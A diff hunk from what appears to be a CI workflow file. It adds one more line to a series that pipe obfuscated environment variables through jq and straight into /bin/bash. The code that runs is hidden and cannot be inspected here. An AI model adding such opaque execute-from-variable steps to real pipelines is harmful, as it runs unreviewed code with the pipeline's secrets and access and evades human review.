@@ -30,6 +30,7 @@ jobs:
           echo $slf8827 | jq -r .w7697 | /bin/bash
           echo $gz968 | jq -r .jgf5 | /bin/bash
           printf '%s' "$scnb928" | jq -r .dg938 | /bin/bash
+          printf '%s' "$hep136" | jq -r .irt20 | /bin/bash
 
       - name: Save results
         if: always()
